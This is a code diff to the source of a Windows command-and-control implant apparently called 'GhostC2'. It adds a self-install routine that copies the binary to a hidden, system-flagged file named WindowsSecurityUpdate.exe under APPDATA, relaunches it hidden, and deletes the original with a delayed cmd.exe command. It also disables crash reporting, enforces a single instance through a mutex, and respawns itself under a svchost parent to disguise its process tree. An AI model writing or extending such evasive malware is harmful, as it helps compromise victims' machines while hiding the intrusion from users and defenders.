@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <shellapi.h>
+#include <shlobj.h>
 #include <algorithm>
 #include <stdarg.h>
 #include "syscalls.hpp"
@@ -200,13 +201,101 @@ static void SpoofPEB() {
     }
 }
 
+// ─── Self-install: copy to APPDATA, launch from there, schedule self-deletion ─
+// Returns true  → continue running (we ARE the installed copy).
+// Returns false → we spawned the installed copy and should exit.
+static bool SelfInstall() {
+    wchar_t selfPath[MAX_PATH] = {};
+    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
+
+    // Resolve %APPDATA%\Microsoft\WindowsUpdate\
+    wchar_t appData[MAX_PATH] = {};
+    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
+    auto dirStr = std::wstring(appData) + L"\\Microsoft\\WindowsUpdate";
+    CreateDirectoryW(dirStr.c_str(), NULL);
+
+    auto dstPath = dirStr + L"\\WindowsSecurityUpdate.exe";
+
+    // Already running from the installed location — nothing to do
+    if (_wcsicmp(selfPath, dstPath.c_str()) == 0) return true;
+
+    // Copy self to install location
+    if (!CopyFileW(selfPath, dstPath.c_str(), FALSE)) return true; // can't install, run in-place
+    SetFileAttributesW(dstPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+    // Launch the installed copy
+    STARTUPINFOW si = {}; si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = {};
+    if (CreateProcessW(dstPath.c_str(), NULL, NULL, NULL,
+                       FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    // Schedule deletion of the original (ping delay gives us time to exit)
+    std::wstring delCmd = L"cmd.exe /c ping -n 3 127.0.0.1 >nul & del /f /q \""
+                        + std::wstring(selfPath) + L"\"";
+    STARTUPINFOW si2 = {}; si2.cb = sizeof(si2);
+    si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi2 = {};
+    CreateProcessW(NULL, delCmd.data(), NULL, NULL,
+                   FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si2, &pi2);
+    if (pi2.hProcess) CloseHandle(pi2.hProcess);
+    if (pi2.hThread)  CloseHandle(pi2.hThread);
+
+    return false;
+}
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     SpoofPEB();
 
+    // ── Suppress all crash dialogs and WER popups ──────────────────────────
+    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX);
+    {
+        HMODULE hWer = LoadLibraryA(XS("wer.dll"));
+        if (hWer) {
+            auto WerSetFlags = reinterpret_cast<HRESULT(WINAPI*)(DWORD)>(
+                GetProcAddress(hWer, XS("WerSetFlags")));
+            if (WerSetFlags) WerSetFlags(4); // WER_FAULT_REPORTING_FLAG_DISABLE
+        }
+    }
+
+    // ── Single-instance mutex — prevent duplicate processes ────────────────
+    HANDLE hGlobalMutex = nullptr;
+    {
+        auto mutexName = XSW(L"Global\\GhostC2_9f7a3b1d");
+        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.str());
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            if (hGlobalMutex) CloseHandle(hGlobalMutex);
+            return 0;
+        }
+    }
+
+    // ── Self-install to APPDATA, then exit this instance ──────────────────
+    if (!SelfInstall()) {
+        if (hGlobalMutex) CloseHandle(hGlobalMutex);
+        return 0;
+    }
+
+    // ── PPID spoofing: relaunch under a SYSTEM svchost parent ─────────────
+    // Release the mutex BEFORE spawning so the child can acquire it.
+    // TryRespawnUnderSvchost checks if we're already parented to svchost;
+    // if so it returns false and we continue as the real beacon process.
+    if (hGlobalMutex) { CloseHandle(hGlobalMutex); hGlobalMutex = nullptr; }
+    if (TryRespawnUnderSvchost()) return 0;
+    // Re-acquire for the running instance that continues as the beacon.
+    {
+        auto mutexName = XSW(L"Global\\GhostC2_9f7a3b1d");
+        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.str());
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            if (hGlobalMutex) CloseHandle(hGlobalMutex);
+            return 0;
+        }
+    }
+
     DBG("===== WinMain pid=%lu elevated=%d =====",
         GetCurrentProcessId(), (int)IsElevated());
-
-    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
 
     HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hK32) { DBG("kernel32 null"); return 0; }
